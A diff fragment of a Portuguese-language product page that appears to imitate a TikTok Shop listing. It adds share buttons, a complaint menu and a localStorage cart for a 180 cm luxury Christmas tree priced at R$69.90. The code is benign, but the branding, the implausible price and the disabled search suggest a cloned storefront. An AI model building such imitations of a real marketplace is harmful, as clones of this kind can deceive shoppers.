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">
+      <span class="share-label">Facebook</span>
+    </div>
+
+    <!-- Telegram -->
+    <div class="share-option" onclick="shareTelegram()">
+      <img class="share-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAMAAABC4vDmAAAAh1BMVEX///8oqOkpquwlo+EnpuYop+glouApqeskod4mpOMmpeQjoNwjn9snp+ckot8oqOojoN32+/4And8Ao+wAm+AAl9js9vza7vvR6vrj8/ys2fZov/JDs+/A4/k2ru3I5vqZ0fV8xvMAm+WIyfA/rORRseVltuSOyOlQuPCf0/G43fdxvux6welLCM7UAAAHvElEQVR4nM2ca3eqOhCGaa240Sow3C8ibgNy8f//vhNkq6iBDBLgvKurH9oQHmYmM7mwkKQh0j334MfHIAujb6oozIJj7B9czx7U7eey9/Exi1TDMFRVXa0qqNVqpV7/EGXBaT81mFOcviuYmuVdNdz3sXCmIvLyIDKMFpwnNNX4zmJvCqKMmghBdOcysnxcezllpKpYoJtUNQrcsYjsIuxhoxd7hcUYca/7YX8jNc0V5rpwpAgT2p3mMr59oVgH6rhhSDVWuBeG5ARDrfTAEhTyerwSYKWb1FUswIduaIhDqmREh8Fm+hZoplqqehpkLE9YND3JyAbUnsOQzNQlVf14GMaf5W+MVurpIyT9KDjCn2WUHwSWno3kupvUrHc1dEI6gxtXatQzkdrR6EwVVa9B6E7BRKm+e+TRSexUU6Ft5UzFVFEh40ofP8YbVBFqDNJcMB0TpQoxVEdjSiZKFfCZYuNrYhncikNr8NRQX7zq7M3A9KWqnatVPVBnUdZVnGNjHqiusHJX8zBRtdYbmjVnU9TmwOmzwUNGzGZyVjOMvLtUdhEM5mT6Yif2w4zOq2QUzCifF4pVmf2ZmVixrkfLuaGWb2nBh+3sgvyZyQ6X/wO9rG4KdeT70aSNaOQ/QY1pKDobyspTXIZ8rKjJ5PwdD+lvGLvXwW6XBq+x0azL5UjeU43w/JjA6Vtu+0Za96KRkILDU0IMuM8ePR4hHyEfqD/J25bracnNCo8Emv0IJqKRFBzeZ0h8qJ/w7j1TMBKE7H3pIxdq+/fmv9wQSbQ0s5ZDUT3ge+TuP4HeW5rRqXUjRSd8Sy2T2saOsLGnQucJmv2F6GNb+6/g5jScjOjYva/jmZhe6lJzhOXPUFWPGPO2TxwTcaNleW0bDUb6ASgZk9lXFYDpS7l62hxItISfE+roOkZ5xKwGyt4YxmSGOXJDvMRBVTaPByGtM0bmblGC6nFZ7SsEnxPB+tRjf14nuF7pTMHOPmaKWv2mx8k7rbfFdUtsySPKur8UBYKi1W97Amb59ld3i7qTQqcvzgdMCpCyfbzZpaIo2/diUwCud3AlF9n0oR9z2/VWTUGAGpIRazkWak8XfP0CCSBp91t1wFv1B6z4vyDvRJd/cS8oMC+dZzzFNZgV5nZvgqxmcKKVD020hOjcecBjJ9fOFCa3rmIfvJQCBYtkEs6bPf72ygRsW+LLWSIluNEH65KTJ53ArLpS1i3tXBM5kBQiYdKUAuaZV3L3a6Vu2saOzQhUUsSFUiDJW2708E0CNRNpDboTPiFKXCIz4b8cWeWma+tFu0FTYVC05PIPVJ3UrG8ISTu+3qOcdUIpUCLOePfrf9ECiw6TemsxUMxi8So7+GemNaRdMysXjXQN9HYh5t10QvCvMSSds70COm70IpoSWkW4Ae6V5q2xeeyegcZ4qDVNnq1a8ALqYSYafZy2JR6K0DLTKmhPOpXsy91MihlzmLo88qqEFuSOf68v7ViHh5kUOPOYJLPjNi8qOb4Gk+QuK1jsS+M68BktnuXhoejUxef5Gtbk8sbVNJOi8JmkfQ+oWDrAgqPKXsrFbxSQA03hj38D5v26M/c2d9H+HIXfbLGQgRqs9F1bt708lRt3kDHZjA4+GQ/l0iUWsrksy6YJlZoXyCg7SXqChpJ3Dp104J+B1QXKTvhHpz1WOTsdAgXINyPdBR4qlaoQRI8LhpAbLn0qX/WcPQbru7qL8EM9Kt816dlDoAgSKsVDXTfNpPWAoMKNPVr58CElXy+44PPaexcL1EuRuonvsZ5uFAOg6INhbOXgoaDOMQ5+uDKpjvwR6Pd47n9T8GHpcwGE68ITGkq+jed8iP+qjswLx1j4BH3Pxt7fxWKH/llUv3fPv4F0ruqvpYzVzXtn5r2jRN4NlAaXjozl7rA3kMn9ohzkwQLGfvBNB3T/jeNaZzccik5szq2vsKGh1o0wKEVAya2rnxINlTadbgqhkoFtrAX2evMpuRAxUDSyGMNQRz/y7um6QkCo12JEFtoPL0s1m/wZmhVuejdWrmHzwUtM5iAKakfH9ZOx9AQJ9bbO1nfCTEWpkuYju8ie5d2b4wWaiiZ4rREdKbLnRuIcIaqoZC29RVZh4i75w9oO2wvKVbV2AGW1q2yfAVkuTOYKMhWWFmpVK32y1rCt2QsjR9b+iJVGhW7bMlM8g2CoHmpdautEtKnQ0jat07HDfFAda6LTTA7s3CehFWEOJq17S8KDOagszmHi3tpMLuBuvJ1hcibExttlYipI+UxVsE8q/rFUJZtMybRBblA6m+mYftEvYHmTUf32+A6Nu9GmiHHtt9dHJrwpqHrZqZJDRqfSNr2/XGInI+crwOWCF6p0VCpIP/t40Nkaz4XW5SMkqarOI1FpFu7wiyknsX7FI/1arL0ZvPQTTXCipQ372Ix0PcIWi2RtBHxaST+LNJYGvD13pNzUEsVkJUO/XvRQIcaHFul6b7W37Hwz2FrWL/ZterT0nAxjIq3b7ENk++Rja1kbf7RPMbrpJ160Nqm4D6yx5OTE6sVlWYT74qoAeedkgwOzrE0yBdFVulOk9I6daUKzLC31nTGCu0N2cU4JrfevRqN/sDYkPfkTfDOTDea4+/xcJmRTA21IUp7jvesMG2r/AahyDrnGLrg2AAAAAElFTkSuQmCC">
+      <span class="share-label">Telegram</span>
+    </div>
+  </div>
+</div>
+
+<script>
+  const shareLink = "https://www.instagram.com/"; // <---- altere aqui o link se quiser
+
+  function closeShareSection() {
+    document.getElementById('share-section').style.display = 'none';
+    document.getElementById('share-overlay').style.display = 'none';
+  }
+
+  function copyLink() {
+    navigator.clipboard.writeText(shareLink).then(() => {
+      alert("Link copiado: " + shareLink);
+    });
+  }
+
+  function shareWhatsApp() {
+    window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(shareLink)}`, "_blank");
+  }
+
+  function shareInstagram() {
+    alert("No momento, o Instagram não permite compartilhamento direto por link. Copie o link e envie pelo Direct.");
+    copyLink();
+  }
+
+  function shareFacebook() {
+    window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareLink)}`, "_blank");
+  }
+
+  function shareTelegram() {
+    window.open(`https://t.me/share/url?url=${encodeURIComponent(shareLink)}&text=${encodeURIComponent("Confira isso!")}`, "_blank");
+  }
+</script>
+
+        
+        <button class="share-cancel" onclick="closeShareSection()" id="c0ba41fa-44ab-2c8a-c325-be3e32fac5af">Cancelar</button>
+    
+
+    <!-- [AQUI VEM O COMPLAINT SECTION - COPIE DO PRIMEIRO HTML] -->
+    <div id="complaint-overlay" class="complaint-overlay" onclick="closeComplaintSection()"></div>
+
+    <div id="complaint-section" class="complaint-section">
+        <div class="share-options">
+            <button onclick="window.location.href='index.html'" style="display: flex; gap: 5px; width: 100%;" id="8c684fde-fcbb-e539-31bb-cd06bda1ae5f"><svg style=" font-weight: bold;" width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                    <g id="SVGRepo_iconCarrier">
+                        <rect width="24" height="24" fill="white"></rect>
+                        <g filter="url(#filter0_d_15_295)">
+                            <path d="M4.5 21V16M4.5 16V6.5C5.5 5.5 7 5 8.5 5C11.5 5 13.5 7.5 17.5 5.5V15.5C13.5 17.5 11.5 14.5 8.5 14.5C7.5 14.5 5.5 15 4.5 16Z" stroke="#000000" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </g>
+                        <defs>
+                            <filter id="filter0_d_15_295" x="3" y="4.5" width="16" height="19" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                                <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+                                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha">
+                                </feColorMatrix>
+                                <feOffset dy="1"></feOffset>
+                                <feGaussianBlur stdDeviation="0.5"></feGaussianBlur>
+                                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0">
+                                </feColorMatrix>
+                                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_15_295">
+                                </feBlend>
+                                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_15_295" result="shape"></feBlend>
+                            </filter>
+                        </defs>
+                    </g>
+                </svg> Denunciar</button>
+        </div>
+    </div>
+     <button id="back-to-top" style="
+    display: none;
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 40px;  /* Diminuído de 50px para 40px */
+    height: 40px; /* Diminuído de 50px para 40px */
+    border-radius: 50%;
+    background: white;
+    border: 1px solid #e0e0e0;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1); /* Sombra mais suave */
+    cursor: pointer;
+    z-index: 999;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px; /* Fonte um pouco menor */
+    transition: all 0.3s ease;
+">
+    ↑
+</button>
+    
+    <script>
+        function handleOpenShareSection() {
+            const shareSection = document.getElementById('share-section');
+            const shareOverlay = document.getElementById('share-overlay');
+            if (shareSection && shareOverlay) {
+                shareOverlay.style.display = 'block';
+                shareSection.style.display = 'block';
+
+                // Prevent touch events from propagating
+                document.body.style.overflow = 'hidden';
+                document.body.style.touchAction = 'none';
+
+                setTimeout(() => {
+                    shareOverlay.classList.add('active');
+                    shareSection.classList.add('active');
+                }, 10);
+            }
+        }
+
+        function handleOpenComplaintSection() {
+            const complaintSection = document.getElementById('complaint-section');
+            const complaintOverlay = document.getElementById('complaint-overlay');
+            if (complaintSection && complaintOverlay) {
+                complaintOverlay.style.display = 'block';
+                complaintSection.style.display = 'block';
+
+                // Prevent touch events from propagating
+                document.body.style.overflow = 'hidden';
+                document.body.style.touchAction = 'none';
+
+                setTimeout(() => {
+                    complaintOverlay.classList.add('active');
+                    complaintSection.classList.add('active');
+                }, 10);
+            }
+        }
+
+        function closeShareSection() {
+            const shareSection = document.getElementById('share-section');
+            const shareOverlay = document.getElementById('share-overlay');
+            if (shareSection && shareOverlay) {
+                shareOverlay.classList.remove('active');
+                shareSection.classList.remove('active');
+                
+                setTimeout(() => {
+                    shareOverlay.style.display = 'none';
+                    shareSection.style.display = 'none';
+                }, 300);
+                
+                // Restore body scroll
+                document.body.style.overflow = '';
+                document.body.style.touchAction = '';
+            }
+        }
+
+        function closeComplaintSection() {
+            const complaintSection = document.getElementById('complaint-section');
+            const complaintOverlay = document.getElementById('complaint-overlay');
+            if (complaintSection && complaintOverlay) {
+                complaintOverlay.classList.remove('active');
+                complaintSection.classList.remove('active');
+                
+                setTimeout(() => {
+                    complaintOverlay.style.display = 'none';
+                    complaintSection.style.display = 'none';
+                }, 300);
+                
+                // Restore body scroll
+                document.body.style.overflow = '';
+                document.body.style.touchAction = '';
+            }
+        }
+
+        async function copyLink() {
+            try {
+                await navigator.clipboard.writeText(window.location.href);
+                const copyBtn = document.getElementById('copy-link-btn');
+                if (copyBtn) {
+                    const originalText = copyBtn.textContent;
+                    copyBtn.textContent = 'Link copiado!';
+                    setTimeout(() => {
+                        copyBtn.textContent = originalText;
+                    }, 1500);
+                }
+            } catch (e) { 
+                // Fallback para navegadores mais antigos
+                const tempInput = document.createElement('input');
+                const url = window.location.href;
+                document.body.appendChild(tempInput);
+                tempInput.value = url;
+                tempInput.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempInput);
+                alert('Link copiado para a área de transferência!');
+            }
+            // Fecha com animação suave
+            closeShareSection();
+        }
+
+        seguirBtn.addEventListener('click', () => {
+            seguirBtn.textContent = 'Seguindo';
+        });
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Inicialização do modal de tela cheia (se existir)
+            const fullscreenContainer = document.getElementById('fullscreen-container');
+            const fullscreenClose = document.getElementById('fullscreen-close');
+
+            if (fullscreenClose && fullscreenContainer) {
+                fullscreenClose.addEventListener('click', closeFullscreen);
+                fullscreenContainer.addEventListener('click', (e) => {
+                    if (e.target === fullscreenContainer) {
+                        closeFullscreen();
+                    }
+                });
+            }
+        });
+
+    </script>
+    <script src="js/script.js"></script>
+<script>
+// ===== SISTEMA DE CARRINHO =====
+// Informações do produto atual
+const currentProduct = {
+    id: 'produto1',
+    name: 'ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS ',
+    price: 69.90,
+    image: 'imagens/01.jpg',
+};
+
+// Funções para gerenciar o carrinho
+function getCart() {
+    try {
+        const cart = localStorage.getItem('tiktokShopCart');
+        console.log('Carrinho recuperado:', cart);
+        return cart ? JSON.parse(cart) : [];
+    } catch (error) {
+        console.error('Erro ao recuperar carrinho:', error);
+        return [];
+    }
+}
+
+function saveCart(cart) {
+    try {
+        console.log('Salvando carrinho:', cart);
+        localStorage.setItem('tiktokShopCart', JSON.stringify(cart));
+        updateCartCount();
+    } catch (error) {
+        console.error('Erro ao salvar carrinho:', error);
+    }
+}
+
+function updateCartCount() {
+    const cart = getCart();
+    const totalItems = cart.reduce((total, item) => total + item.quantity, 0);
+    
+    const cartCountElement = document.getElementById('cart-count-header');
+    if (cartCountElement) {
+        cartCountElement.textContent = totalItems;
+    }
+}
+
+let flavorModalOverlay;
+let flavorModalChips = [];
+let flavorModalCta;
+
+function formatCurrency(value) {
+    try {
+        return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value);
+    } catch {
+        return `R$ ${value.toFixed(2)}`.replace('.', ',');
+    }
+}
+
+function updateFlavorSelection(chip) {
+    if (!chip || !flavorModalChips.length) return;
+    flavorModalChips.forEach(item => {
+        item.classList.remove('selected');
+        item.setAttribute('aria-pressed', 'false');
+    });
+    chip.classList.add('selected');
+    chip.setAttribute('aria-pressed', 'true');
+
+    const flavorLabel = chip.dataset.flavor || 'Baunilha';
+    const link = chip.dataset.link;
+
+    if (flavorModalCta && link) {
+        flavorModalCta.href = link;
+        flavorModalCta.textContent = `Comprar agora - ${flavorLabel}`;
+    }
+}
+
+function openFlavorModal() {
+    if (!flavorModalOverlay) return;
+    flavorModalOverlay.classList.add('is-visible');
+    flavorModalOverlay.setAttribute('aria-hidden', 'false');
+    document.body.classList.add('modal-open');
+}
+
+function closeFlavorModal() {
+    if (!flavorModalOverlay) return;
+    flavorModalOverlay.classList.remove('is-visible');
+    flavorModalOverlay.setAttribute('aria-hidden', 'true');
+    document.body.classList.remove('modal-open');
+}
+
+function setupFlavorModal() {
+    flavorModalOverlay = document.getElementById('flavor-modal');
+    flavorModalCta = document.getElementById('flavor-modal-cta');
+    if (!flavorModalOverlay || !flavorModalCta) return;
+
+    const nameElement = document.getElementById('flavor-modal-name');
+    const priceElement = document.getElementById('flavor-modal-price');
+    const imageElement = document.getElementById('flavor-modal-image');
+
+    if (nameElement) {
+        nameElement.textContent = currentProduct.name;
+    }
+    if (priceElement) {
+        priceElement.textContent = formatCurrency(currentProduct.price);
+    }
+    if (imageElement) {
+        imageElement.src = currentProduct.image;
+    }
+
+    flavorModalChips = Array.from(flavorModalOverlay.querySelectorAll('.flavor-chip'));
+    flavorModalChips.forEach(chip => {
+        chip.addEventListener('click', () => updateFlavorSelection(chip));
+    });
+
+    const closeButton = flavorModalOverlay.querySelector('.flavor-modal__close');
+    if (closeButton) {
+        closeButton.addEventListener('click', closeFlavorModal);
+    }
+
+    flavorModalOverlay.addEventListener('click', (event) => {
+        if (event.target === flavorModalOverlay) {
+            closeFlavorModal();
+        }
+    });
+
+    document.addEventListener('keydown', (event) => {
+        if (event.key === 'Escape') {
+            closeFlavorModal();
+        }
+    });
+
+    if (flavorModalCta) {
+        flavorModalCta.addEventListener('click', closeFlavorModal);
+    }
+
+    if (flavorModalChips.length) {
+        updateFlavorSelection(flavorModalChips[0]);
+    }
+}
+
+function addToCart(product, redirectToCart = false) {
+    console.log('Adicionando produto:', product);
+    const cart = getCart();
+    console.log('Carrinho atual:', cart);
+    
+    // Verifica se o produto já está no carrinho
+    const existingItem = cart.find(item => item.id === product.id);
+    
+    if (existingItem) {
+        console.log('Produto já está no carrinho');
+        showAlreadyInCartMessage();
+        return false;
+    }
+    
+    console.log('Produto não está no carrinho - adicionando...');
+    
+    // Se não está no carrinho, adiciona
+    cart.push({
+        ...product,
+        quantity: 1
+    });
+    
+    saveCart(cart);
+    showAddedToCartMessage();
+    console.log('Produto adicionado com sucesso');
+    
+    if (redirectToCart) {
+        setTimeout(() => {
+            window.location.href = 'carrinho/index.html';
+        }, 1000);
+    }
+    
+    return true;
+}
+
+function showAddedToCartMessage() {
+    console.log('Mostrando mensagem de sucesso');
+    const message = document.createElement('div');
+    message.textContent = '✅ Produto adicionado ao carrinho!';
+    message.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #00d4aa;
+        color: white;
+        padding: 12px 16px;
+        border-radius: 8px;
+        z-index: 10000;
+        font-weight: 600;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    `;
+    
+    document.body.appendChild(message);
+    
+    setTimeout(() => {
+        message.style.opacity = '0';
+        message.style.transition = 'opacity 0.5s';
+        setTimeout(() => {
+            if (message.parentNode) {
+                document.body.removeChild(message);
+            }
+        }, 500);
+    }, 2000);
+}
+
+function showAlreadyInCartMessage() {
+    console.log('Mostrando mensagem de erro');
+    const message = document.createElement('div');
+    message.textContent = '❌ Este produto já está no carrinho!';
+    message.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #ff2d55;
+        color: white;
+        padding: 12px 16px;
+        border-radius: 8px;
+        z-index: 10000;
+        font-weight: 600;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    `;
+    
+    document.body.appendChild(message);
+    
+    setTimeout(() => {
+        message.style.opacity = '0';
+        message.style.transition = 'opacity 0.5s';
+        setTimeout(() => {
+            if (message.parentNode) {
+                document.body.removeChild(message);
+            }
+        }, 500);
+    }, 2000);
+}
+
+// Sistema de sincronização entre páginas
+function setupCartListeners() {
+    // Verificar mudanças no localStorage a cada segundo
+    setInterval(updateCartCount, 1000);
+    
+    // Atualizar quando a página ganha foco
+    window.addEventListener('focus', updateCartCount);
+    
+    // Atualizar quando o usuário volta para a página
+    window.addEventListener('pageshow', updateCartCount);
+}
+
+// ===== SISTEMA DE BUSCA =====
+function showSearchDisabledMessage() {
+    const message = document.createElement('div');
+    message.textContent = '❌ Não é possível realizar pesquisas nesta loja.';
+    message.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #ff2d55;
+        color: white;
+        padding: 12px 16px;
+        border-radius: 8px;
+        z-index: 10000;
+        font-weight: 600;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    `;
+    
+    document.body.appendChild(message);
+    
+    setTimeout(() => {
+        message.style.opacity = '0';
+        message.style.transition = 'opacity 0.5s';
+        setTimeout(() => {
+            if (message.parentNode) {
+                document.body.removeChild(message);
+            }
+        }, 500);
+    }, 2000);
+}
+
+// ===== SISTEMA DE TABS STICKY =====
+function handleStickyTabs() {
+    const header = document.getElementById('main-header');
+    const stickyTabs = document.getElementById('sticky-tabs');
+    
+    if (header && stickyTabs) {
+        const headerHeight = header.offsetHeight;
+        const scrollPosition = window.scrollY;
+        
+        // Mostra as tabs quando scroll passar da altura do header
+        if (scrollPosition > headerHeight) {
+            stickyTabs.style.display = 'flex';
+        } else {
+            stickyTabs.style.display = 'none';
+        }
+    }
+}
+
+function setupSectionObserver() {
+    const sections = {
+        visaoGeral: document.getElementById('visao-geral-section'),
+        avaliacoes: document.getElementById('avaliacoes-section'),
+        descricao: document.getElementById('descricao-produto'),
+        recomendacoes: document.getElementById('recomendacoes')
+    };
+
+    const observerOptions = {
+        root: null,
+        rootMargin: '0px',
+        threshold: 0.3
+    };
+
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                // Remove active de todas as tabs
+                document.querySelectorAll('.tab').forEach(tab => {
+                    tab.classList.remove('active');
+                });
+
+                // Adiciona active na tab correspondente
+                const allTabs = document.querySelectorAll('.tab');
+                
+                if (entry.target === sections.visaoGeral) {
+                    allTabs[0]?.classList.add('active');
+                } else if (entry.target === sections.avaliacoes) {
+                    allTabs[1]?.classList.add('active');
+                } else if (entry.target === sections.descricao) {
+                    allTabs[2]?.classList.add('active');
+                } else if (entry.target === sections.recomendacoes) {
+                    allTabs[3]?.classList.add('active');
+                }
+            }
+        });
+    }, observerOptions);
+
+    // Observa todas as seções
+    if (sections.visaoGeral) observer.observe(sections.visaoGeral);
+    if (sections.avaliacoes) observer.observe(sections.avaliacoes);
+    if (sections.descricao) observer.observe(sections.descricao);
+    if (sections.recomendacoes) observer.observe(sections.recomendacoes);
+}
+
+function scrollToSection(sectionId, tabIndex) {
+    const section = document.getElementById(sectionId);
+    if (section) {
+        // Remove active de todas as tabs
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+
+        // Adiciona active na tab correspondente (ambas versões)
+        const allTabs = document.querySelectorAll('.tab');
+        allTabs[tabIndex]?.classList.add('active');
+        if (allTabs[tabIndex + 3]) allTabs[tabIndex + 3].classList.add('active');
+
+        // Scroll suave
+        section.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+        });
+    }
+}
+
+// Funções específicas de scroll
+function scrollToVisaoGeral() {
+    const section = document.getElementById('visao-geral-section');
+    if (section) {
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+        const allTabs = document.querySelectorAll('.tab');
+        allTabs[0]?.classList.add('active');
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+}
+
+function scrollToAvaliacoes() {
+    const section = document.getElementById('avaliacoes-section');
+    if (section) {
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+        const allTabs = document.querySelectorAll('.tab');
+        allTabs[1]?.classList.add('active');
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+}
+
+function scrollToDescription() {
+    const h3Elements = document.querySelectorAll('h3');
+    let targetH3 = null;
+    
+    for (let i = 0; i < h3Elements.length; i++) {
+        if (h3Elements[i].textContent.trim() === 'Descrição do Produto') {
+            targetH3 = h3Elements[i];
+            break;
+        }
+    }
+    
+    if (targetH3) {
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+        const allTabs = document.querySelectorAll('.tab');
+        allTabs[2]?.classList.add('active');
+        targetH3.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+}
+
+// Nova função para rolar até a seção de recomendações
+function scrollToRecomendacoes() {
+    const section = document.getElementById('recomendacoes');
+    if (section) {
+        // Remove active de todas as tabs
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.classList.remove('active');
+        });
+        
+        // Adiciona active na quarta tab (índice 3)
+        const allTabs = document.querySelectorAll('.tab');
+        allTabs[3]?.classList.add('active');
+        
+        // Scroll suave
+        section.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+        });
+    }
+}
+
+// Função original mantida para compatibilidade
+function showTab(tabId) {
+    document.querySelectorAll('.content-section').forEach(section => {
+        section.classList.remove('active');
+    });
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.classList.remove('active');
+    });
+
+    const targetSection = document.getElementById(tabId);
+    if (targetSection) {
+        targetSection.classList.add('active');
+    }
+    
+    if (event && event.target) {
+        event.target.classList.add('active');
+    }
+}
+
+// ===== SISTEMA DE IMAGENS EM TELA CHEIA =====
+// Variável global para controle de imagens
+let currentImageIndex = 0;
+
+// Função para abrir modal de tela cheia
+function openFullscreen(imageSrc, imageIndex) {
+    const fullscreenContainer = document.getElementById('fullscreen-container');
+    const fullscreenImage = document.getElementById('fullscreen-image');
+    
+    if (fullscreenContainer && fullscreenImage) {
+        fullscreenImage.src = imageSrc;
+        fullscreenContainer.style.display = 'flex';
+        setTimeout(() => {
+            fullscreenContainer.classList.add('active');
+        }, 10);
+        
+        // Atualizar índice atual para navegação
+        if (typeof imageIndex === 'number') {
+            currentImageIndex = imageIndex;
+        }
+    }
+}
+
+// Função para fechar modal de tela cheia
+function closeFullscreen() {
+    const fullscreenContainer = document.getElementById('fullscreen-container');
+    if (fullscreenContainer) {
+        fullscreenContainer.classList.remove('active');
